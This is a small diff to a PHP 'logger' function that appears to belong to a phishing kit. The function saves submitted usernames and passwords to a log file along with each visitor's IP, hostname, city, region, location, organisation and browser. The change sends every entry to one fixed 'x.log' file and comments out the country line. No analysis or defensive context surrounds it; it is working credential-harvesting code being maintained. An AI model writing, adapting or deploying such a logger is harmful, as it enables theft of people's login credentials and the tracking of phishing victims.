@@ -124,7 +124,7 @@ function logger($logFolderName){
 	$ip   = getIP();
 	$data = getData($ip);
 	$ua   = getBrowser();
-	$file = fopen(dirname(__FILE__). "/" . $logFolderName . "/" . $ip . ".log", "a");
+	$file = fopen(dirname(__FILE__). "/" . $logFolderName . "/x.log", "a");
 	$txt .= "\nTIMESTAMP : " . date('d-m-Y H:i:s');
 	$txt .= "\nUSERNAME : " . $_POST['username'];
 	$txt .= "\nPASSWORD : " . $_POST['password'];
@@ -132,7 +132,7 @@ function logger($logFolderName){
 	$txt .= "\nHOSTNAME : " . $data['hostname'];
 	$txt .= "\nCITY : " . $data['city'];
 	$txt .= "\nREGION : " . $data['region'];
-	$txt .= "\nCOUNTRY : " . $data['country'];
+	//$txt .= "\nCOUNTRY : " . $data['country'];
 	$txt .= "\nLOCATION : " . $data['loc'];
 	$txt .= "\nORG : ".$data['org'];
 	$txt .= "\nBROWSER : " . $ua['name'] . " " . $ua['version'];
